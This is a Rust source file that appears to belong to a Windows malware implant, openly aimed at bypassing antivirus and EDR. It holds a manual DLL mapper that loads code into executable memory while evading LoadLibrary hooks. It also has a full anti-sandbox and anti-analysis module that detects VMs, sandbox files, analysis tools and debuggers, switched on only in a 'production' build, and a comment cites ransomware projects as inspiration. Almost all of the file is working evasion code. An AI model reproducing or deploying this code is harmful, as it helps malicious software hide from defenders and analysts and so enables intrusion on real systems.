// Evasión avanzada para bypass AV/EDR
#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use std::mem;
#[cfg(target_os = "windows")]
use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
#[cfg(target_os = "windows")]
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE};
#[cfg(target_os = "windows")]
use winapi::shared::minwindef::{LPVOID, DWORD};
#[cfg(target_os = "windows")]
use winapi::um::errhandlingapi::GetLastError;

#[cfg(target_os = "windows")]
#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    _padding: [u8; 58],
    e_lfanew: i32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IMAGE_NT_HEADERS {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: IMAGE_OPTIONAL_HEADER,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IMAGE_FILE_HEADER {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IMAGE_OPTIONAL_HEADER {
    magic: u16,
    _padding1: [u8; 14],
    address_of_entry_point: u32,
    _padding2: [u8; 8],
    image_base: usize,
    _padding3: [u8; 12],
    size_of_image: u32,
    size_of_headers: u32,
    _padding4: [u8; 56],
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IMAGE_SECTION_HEADER {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _padding: [u8; 12],
    characteristics: u32,
}

#[cfg(target_os = "windows")]
#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    _padding1: [u8; 16],
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}



/// Manual DLL mapping (bypass LoadLibrary hooks)
#[cfg(target_os = "windows")]
pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
    // 1. Parse DOS header
    if dll_bytes.len() < mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err("DLL too small".to_string());
    }
    
    let dos_header = &*(dll_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {  // "MZ"
        return Err("Invalid DOS header".to_string());
    }
    
    // 2. Parse NT headers
    let nt_headers_offset = dos_header.e_lfanew as usize;
    if dll_bytes.len() < nt_headers_offset + mem::size_of::<IMAGE_NT_HEADERS>() {
        return Err("Invalid NT headers offset".to_string());
    }
    
    let nt_headers = &*(dll_bytes.as_ptr().add(nt_headers_offset) as *const IMAGE_NT_HEADERS);
    if nt_headers.signature != 0x4550 {  // "PE\0\0"
        return Err("Invalid PE signature".to_string());
    }
    
    let image_size = nt_headers.optional_header.size_of_image as usize;
    let headers_size = nt_headers.optional_header.size_of_headers as usize;
    
    // 3. Allocate memory - SIMPLIFICADO: VirtualAlloc directo
    let base_addr = VirtualAlloc(
        ptr::null_mut(),
        image_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    
    if base_addr.is_null() {
        let error_code = GetLastError();
        return Err(format!("VirtualAlloc failed: error code {}", error_code));
    }
    
    // 4. Copy headers
    ptr::copy_nonoverlapping(
        dll_bytes.as_ptr(),
        base_addr as *mut u8,
        headers_size,
    );
    
    // 5. Copy sections
    let section_header_offset = nt_headers_offset 
        + mem::size_of::<IMAGE_NT_HEADERS>()
        - mem::size_of::<IMAGE_OPTIONAL_HEADER>()
        + nt_headers.file_header.size_of_optional_header as usize;
    
    for i in 0..nt_headers.file_header.number_of_sections {
        let section = &*(dll_bytes.as_ptr().add(
            section_header_offset + i as usize * mem::size_of::<IMAGE_SECTION_HEADER>()
        ) as *const IMAGE_SECTION_HEADER);
        
        if section.size_of_raw_data > 0 {
            let dest = (base_addr as usize + section.virtual_address as usize) as *mut u8;
            let src = dll_bytes.as_ptr().add(section.pointer_to_raw_data as usize);
            
            ptr::copy_nonoverlapping(
                src,
                dest,
                section.size_of_raw_data as usize,
            );
        }
    }
    
    // 6. Make sections executable
    let mut old_protect: DWORD = 0;
    VirtualProtect(
        base_addr,
        image_size,
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    );
    
    Ok(base_addr as LPVOID)
}

/// Obtener dirección de función exportada
#[cfg(target_os = "windows")]
pub unsafe fn get_export_address(base_addr: LPVOID, func_name: &str) -> Option<LPVOID> {
    let dos_header = &*(base_addr as *const IMAGE_DOS_HEADER);
    let nt_headers = &*((base_addr as usize + dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS);
    
    // Obtener export directory RVA (está en DataDirectory[0])
    let export_dir_rva_ptr = (base_addr as usize 
        + dos_header.e_lfanew as usize 
        + mem::size_of::<u32>()  // Signature
        + mem::size_of::<IMAGE_FILE_HEADER>()
        + 96) as *const u32;  // Offset to DataDirectory[0].VirtualAddress
    
    let export_dir_rva = *export_dir_rva_ptr;
    if export_dir_rva == 0 {
        return None;
    }
    
    let export_dir = &*((base_addr as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    
    let names_rva = export_dir.address_of_names;
    let functions_rva = export_dir.address_of_functions;
    let ordinals_rva = export_dir.address_of_name_ordinals;
    
    let names = (base_addr as usize + names_rva as usize) as *const u32;
    let functions = (base_addr as usize + functions_rva as usize) as *const u32;
    let ordinals = (base_addr as usize + ordinals_rva as usize) as *const u16;
    
    // Buscar función por nombre
    for i in 0..export_dir.number_of_names {
        let name_rva = *names.add(i as usize);
        let name_ptr = (base_addr as usize + name_rva as usize) as *const i8;
        
        let mut j = 0;
        let mut match_found = true;
        let func_name_bytes = func_name.as_bytes();
        
        while *name_ptr.add(j) != 0 && j < func_name_bytes.len() {
            if *name_ptr.add(j) as u8 != func_name_bytes[j] {
                match_found = false;
                break;
            }
            j += 1;
        }
        
        if match_found && *name_ptr.add(j) == 0 && j == func_name_bytes.len() {
            let ordinal = *ordinals.add(i as usize);
            let func_rva = *functions.add(ordinal as usize);
            return Some((base_addr as usize + func_rva as usize) as LPVOID);
        }
    }
    
    None
}


// ============================================================================
// Anti-Sandbox and Anti-Analysis Features
// ============================================================================
// These features are conditionally compiled and only active in production mode
// They detect VMs, sandboxes, debuggers, and other analysis environments
// Inspired by: Rust-Ransomware, rustomware, and Nightmangle

/// Checks if the system is running in a sandbox environment
/// Returns true if sandbox is detected, false otherwise
#[cfg(all(feature = "production", target_os = "windows"))]
pub fn is_sandbox() -> bool {
    // Multiple checks to detect sandbox environments
    detect_vm() || detect_sandbox_artifacts() || detect_low_resources() || detect_debugger()
}

/// Dummy implementation for non-Windows or dev mode
#[cfg(not(all(feature = "production", target_os = "windows")))]
pub fn is_sandbox() -> bool {
    false
}

/// Detects if running inside a Virtual Machine
#[cfg(all(feature = "production", target_os = "windows"))]
fn detect_vm() -> bool {
    use std::process::Command;
    
    // Check 1: BIOS/System manufacturer
    if check_system_manufacturer() {
        return true;
    }
    
    // Check 2: Common VM registry keys
    if check_vm_registry_keys() {
        return true;
    }
    
    // Check 3: VM-specific files
    if check_vm_files() {
        return true;
    }
    
    // Check 4: MAC address patterns (VMware, VirtualBox, QEMU)
    if check_vm_mac_address() {
        return true;
    }
    
    false
}

/// Check system manufacturer for VM indicators
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_system_manufacturer() -> bool {
    use std::process::Command;
    
    let output = Command::new("wmic")
        .args(&["computersystem", "get", "manufacturer"])
        .output();
    
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
        
        // Known VM manufacturers
        let vm_vendors = [
            "vmware",
            "virtualbox",
            "qemu",
            "microsoft corporation", // Hyper-V
            "xen",
            "parallels",
        ];
        
        for vendor in &vm_vendors {
            if text.contains(vendor) {
                return true;
            }
        }
    }
    
    false
}

/// Check for VM-specific registry keys
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_vm_registry_keys() -> bool {
    use std::process::Command;
    
    // VMware registry keys
    let vmware_keys = [
        r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
        r"HKLM\SYSTEM\ControlSet001\Services\vmmouse",
        r"HKLM\SYSTEM\ControlSet001\Services\vmhgfs",
    ];
    
    // VirtualBox registry keys
    let vbox_keys = [
        r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
        r"HKLM\HARDWARE\ACPI\DSDT\VBOX__",
    ];
    
    // Check VMware keys
    for key in &vmware_keys {
        let output = Command::new("reg")
            .args(&["query", key])
            .output();
        
        if let Ok(out) = output {
            if out.status.success() {
                return true;
            }
        }
    }
    
    // Check VirtualBox keys
    for key in &vbox_keys {
        let output = Command::new("reg")
            .args(&["query", key])
            .output();
        
        if let Ok(out) = output {
            if out.status.success() {
                return true;
            }
        }
    }
    
    false
}

/// Check for VM-specific files
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_vm_files() -> bool {
    use std::path::Path;
    
    let vm_files = [
        r"C:\windows\System32\Drivers\Vmmouse.sys",
        r"C:\windows\System32\Drivers\vmhgfs.sys",
        r"C:\windows\System32\Drivers\VBoxMouse.sys",
        r"C:\windows\System32\Drivers\VBoxGuest.sys",
        r"C:\windows\System32\Drivers\VBoxSF.sys",
        r"C:\windows\System32\vboxdisp.dll",
        r"C:\windows\System32\vboxhook.dll",
        r"C:\windows\System32\vboxoglerrorspu.dll",
    ];
    
    for file in &vm_files {
        if Path::new(file).exists() {
            return true;
        }
    }
    
    false
}

/// Check MAC address for VM patterns
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_vm_mac_address() -> bool {
    use std::process::Command;
    
    let output = Command::new("getmac")
        .output();
    
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
        
        // Known VM MAC address prefixes
        let vm_mac_prefixes = [
            "00:05:69", // VMware
            "00:0c:29", // VMware
            "00:1c:14", // VMware
            "00:50:56", // VMware
            "08:00:27", // VirtualBox
            "52:54:00", // QEMU/KVM
            "00:15:5d", // Hyper-V
        ];
        
        for prefix in &vm_mac_prefixes {
            if text.contains(prefix) {
                return true;
            }
        }
    }
    
    false
}

/// Detects sandbox-specific artifacts
#[cfg(all(feature = "production", target_os = "windows"))]
fn detect_sandbox_artifacts() -> bool {
    use std::process::Command;
    use std::path::Path;
    
    // Check 1: Known sandbox process names
    if check_sandbox_processes() {
        return true;
    }
    
    // Check 2: Sandbox-specific files
    let sandbox_files = [
        r"C:\analysis",
        r"C:\sandbox",
        r"C:\sample.exe",
        r"C:\malware.exe",
    ];
    
    for file in &sandbox_files {
        if Path::new(file).exists() {
            return true;
        }
    }
    
    // Check 3: Wine detection (used in some sandboxes)
    if check_wine() {
        return true;
    }
    
    false
}

/// Check for known sandbox processes
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_sandbox_processes() -> bool {
    use std::process::Command;
    
    let output = Command::new("tasklist")
        .output();
    
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
        
        // Known sandbox/analysis tool processes
        let sandbox_processes = [
            "vmsrvc.exe",
            "vmusrvc.exe",
            "vboxtray.exe",
            "vmwaretray.exe",
            "vmwareuser.exe",
            "vmacthlp.exe",
            "sandboxiedcomlaunch.exe",
            "sandboxierpcss.exe",
            "procmon.exe",
            "procexp.exe",
            "wireshark.exe",
            "fiddler.exe",
            "ollydbg.exe",
            "ida.exe",
            "ida64.exe",
            "x64dbg.exe",
            "x32dbg.exe",
            "windbg.exe",
        ];
        
        for proc in &sandbox_processes {
            if text.contains(proc) {
                return true;
            }
        }
    }
    
    false
}

/// Check for Wine (Windows emulation layer)
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_wine() -> bool {
    use std::process::Command;
    
    let output = Command::new("reg")
        .args(&["query", r"HKCU\Software\Wine"])
        .output();
    
    if let Ok(out) = output {
        if out.status.success() {
            return true;
        }
    }
    
    false
}

/// Detects if system has suspiciously low resources (common in sandboxes)
#[cfg(all(feature = "production", target_os = "windows"))]
fn detect_low_resources() -> bool {
    // Check 1: Low RAM (sandboxes typically have < 4GB)
    if check_low_memory() {
        return true;
    }
    
    // Check 2: Low CPU cores (sandboxes typically have 1-2 cores)
    if check_low_cpu_cores() {
        return true;
    }
    
    // Check 3: Small disk size
    if check_small_disk() {
        return true;
    }
    
    false
}

/// Check if system has suspiciously low RAM
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_memory() -> bool {
    use std::process::Command;
    
    let output = Command::new("wmic")
        .args(&["computersystem", "get", "totalphysicalmemory"])
        .output();
    
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        
        // Parse memory value (in bytes)
        for line in text.lines() {
            if let Ok(bytes) = line.trim().parse::<u64>() {
                // Less than 4GB is suspicious
                let gb = bytes / (1024 * 1024 * 1024);
                if gb < 4 {
                    return true;
                }
            }
        }
    }
    
    false
}

/// Check if system has suspiciously few CPU cores
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_low_cpu_cores() -> bool {
    use std::process::Command;
    
    let output = Command::new("wmic")
        .args(&["cpu", "get", "numberofcores"])
        .output();
    
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        
        for line in text.lines() {
            if let Ok(cores) = line.trim().parse::<u32>() {
                // Less than 2 cores is suspicious
                if cores < 2 {
                    return true;
                }
            }
        }
    }
    
    false
}

/// Check if disk is suspiciously small
#[cfg(all(feature = "production", target_os = "windows"))]
fn check_small_disk() -> bool {
    use std::process::Command;
    
    let output = Command::new("wmic")
        .args(&["logicaldisk", "where", "DeviceID='C:'", "get", "size"])
        .output();
    
    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        
        for line in text.lines() {
            if let Ok(bytes) = line.trim().parse::<u64>() {
                // Less than 60GB is suspicious
                let gb = bytes / (1024 * 1024 * 1024);
                if gb < 60 {
                    return true;
                }
            }
        }
    }
    
    false
}

/// Detects if a debugger is attached
#[cfg(all(feature = "production", target_os = "windows"))]
fn detect_debugger() -> bool {
    unsafe {
        // Use IsDebuggerPresent WinAPI
        use winapi::um::debugapi::IsDebuggerPresent;
        
        if IsDebuggerPresent() != 0 {
            return true;
        }
        
        // Additional check: PEB BeingDebugged flag
        if check_peb_being_debugged() {
            return true;
        }
    }
    
    false
}

/// Check PEB (Process Environment Block) BeingDebugged flag
#[cfg(all(feature = "production", target_os = "windows"))]
unsafe fn check_peb_being_debugged() -> bool {
    use winapi::um::processthreadsapi::GetCurrentProcess;
    use winapi::um::winnt::HANDLE;
    
    // Access PEB through TEB (Thread Environment Block)
    // This is a more direct way to check the BeingDebugged flag
    #[cfg(target_arch = "x86_64")]
    {
        let peb: *const u8;
        std::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, preserves_flags)
        );
        
        if !peb.is_null() {
            // BeingDebugged is at offset 0x02 in PEB
            let being_debugged = *peb.add(0x02);
            if being_debugged != 0 {
                return true;
            }
        }
    }
    
    false
}

/// Time-based sandbox detection
/// Many sandboxes accelerate time to speed up analysis
#[cfg(all(feature = "production", target_os = "windows"))]
pub fn detect_time_acceleration() -> bool {
    use std::time::{Duration, Instant};
    use std::thread;
    
    let start = Instant::now();
    thread::sleep(Duration::from_secs(1));
    let elapsed = start.elapsed();
    
    // If less than 900ms elapsed, time was accelerated
    if elapsed.as_millis() < 900 {
        return true;
    }
    
    false
}

/// Comprehensive anti-sandbox check
/// Runs multiple checks and returns true if any sandbox indicator is found
#[cfg(all(feature = "production", target_os = "windows"))]
pub fn run_anti_sandbox_checks() -> bool {
    // Run all checks
    if is_sandbox() {
        return true;
    }
    
    // Time acceleration check
    if detect_time_acceleration() {
        return true;
    }
    
    false
}

/// Dummy implementation for dev mode or non-Windows
#[cfg(not(all(feature = "production", target_os = "windows")))]
pub fn run_anti_sandbox_checks() -> bool {
    false
}
